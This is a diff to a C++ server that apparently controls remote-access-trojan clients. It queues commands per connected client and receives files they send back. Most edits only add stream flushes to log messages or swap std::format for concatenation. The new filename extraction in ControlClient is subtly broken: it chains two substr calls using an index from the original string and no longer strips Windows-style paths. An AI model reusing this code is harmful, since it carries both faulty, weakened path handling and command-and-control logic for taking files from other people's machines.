@@ -86,14 +86,14 @@ int Server::Listen()
 	if (sock_.GetSocket() == INVALID_SOCKET) return -1;
 	#ifdef _WIN32
 		if (listen(sock_.GetSocket(), 0x7fffffff) == SOCKET_ERROR) {
-			std::cout << "Failed to listen on socket. errno: " << WSAGetLastError() << std::endl;
+			std::cout << "Failed to listen on socket. errno: " << WSAGetLastError() << std::endl << std::flush;
 			WSACleanup();
 			Clean();
 			return -1;
 		}
 	#else
     	if (listen(sock_.GetSocket(), GetMaxClient()) < 0) {
-    		std::cout << "Failed to listen on socket. errno: " << errno << std::endl;
+    		std::cout << "Failed to listen on socket. errno: " << errno << std::endl << std::flush;
 			Clean();
 			return -1;
 		}
@@ -140,7 +140,7 @@ void ServerInput::TakeUserInput() const
 		}
 		if (command.size() > (size_t)900){
             global_mutex.lock();
-			std::cout << "The command is too long, please try agian." << std::endl;
+			std::cout << "The command is too long, please try agian." << std::endl << std::flush;
             global_mutex.unlock();
 		}
         if (command.size() >= 4 && command.starts_with("exit"))
@@ -153,10 +153,10 @@ void ServerInput::TakeUserInput() const
             continue;
         } 
 
-		std::string addr = std::format("{}:{}", cmd.GetIpAddress(), cmd.GetPort());
-        if (ServerInput::server_request_map_.contains(addr))
+		std::string address = cmd.GetIpAddress() + ":" + std::to_string(cmd.GetPort());
+        if (ServerInput::server_request_map_.contains(address))
         {
-            ServerInput::server_request_map_[addr].push(cmd);
+            ServerInput::server_request_map_[address].push(cmd);
         }
     }
 	return;
@@ -199,7 +199,7 @@ HandleClient::HandleClient(unsigned long long client_socket, sockaddr_in client_
 	port = std::to_string(htons(client_addr.sin_port));
 	address = ip + ":" + port;
 	global_mutex.lock();
-	std::cout << "Client connected: " << address << std::endl;
+	std::cout << "Client connected: " << address << std::endl << std::flush;
     ServerInput::server_request_map_[address] = std::queue<ServerCmd>();
 	global_mutex.unlock();
 }
@@ -227,7 +227,9 @@ void HandleClient::ControlClient()
 		sock.SendBytes(server_cmd.ToTcpPacket());
 		if (server_cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
 		{
-			std::string file_name = std::filesystem::path(server_cmd.GetArgument()).filename().string();
+			std::string file_path = server_cmd.GetArgument();
+			std::string file_name = file_path.substr(file_path.rfind('/') + 1).substr(file_path.rfind('/') + 1);
+
 			File f(file_name);
 			f.RecvFileThroughSocket(sock);
 		}
@@ -235,7 +237,7 @@ void HandleClient::ControlClient()
 
 	global_mutex.lock();
     ServerInput::server_request_map_.erase(address);
-	std::cout << "Client disconnected: " << address << std::endl;
+	std::cout << "Client disconnected: " << address << std::endl << std::flush;
 	global_mutex.unlock();
 	return;
 
